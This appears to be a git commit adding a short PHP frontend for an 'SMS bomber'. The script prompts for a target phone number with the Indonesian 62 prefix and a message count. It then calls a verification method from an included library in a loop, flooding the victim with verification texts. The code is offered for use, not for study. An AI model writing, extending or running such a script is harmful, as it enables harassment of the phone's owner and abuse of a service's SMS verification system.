3d879882a9f271250b0a2b3cde569ed360a91752
S4ufiX21 <40340653+S4ufiX21@users.noreply.github.com>
2018-06-20 01:38:59 +0700

    Add files via upload

---
+++ 4.php
@@ -0,0 +1,18 @@
+<?php
+include 'bomphd.php';
+/*
+    https://github.com/nee48/BomSmsPhD
+    Made by Handika Pratama
+    Modified by ?????
+*/
+$init = new Bom();
+//Eksekusi Sms Boomber
+echo "Nomor Target (pakai 62): ";
+$a = trim(fgets(STDIN));
+$init->no = "$a";
+echo "Jumlah Pesan: ";
+$b = trim(fgets(STDIN));
+$loop = "$b";
+for ($i=0; $i < $loop; $i++) {
+    $init->Verif($init->no);
+}
